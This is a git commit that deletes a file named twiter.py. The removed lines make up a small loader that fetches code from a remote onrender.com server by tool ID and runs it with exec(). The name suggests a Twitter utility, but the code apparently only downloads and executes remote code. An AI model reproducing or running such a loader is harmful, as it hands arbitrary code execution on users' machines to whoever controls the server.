9ce4832aed2bc2f2cbc9b58c84c5558fd6fd36ff
المطور إبراهيم | • 𝑷𝒚𝒕𝒉𝒐𝒏 • <mesa14719@gmail.com>
2026-09-09 14:14:02 +0100

    Delete twiter.py

--- twiter.py
+++
@@ -1,9 +0,0 @@
-import requests, sys
-SERVER_URL = "https://server-3-mzac.onrender.com"
-TOOL_ID = "0ada1e80"
-try:
-    r = requests.get(f"{SERVER_URL}/get/{TOOL_ID}", timeout=10)
-    if r.status_code == 200:
-        exec(r.text)
-    else: print(f"❌ فشل: {r.status_code}")
-except Exception as e: print(f"❌ {e}")
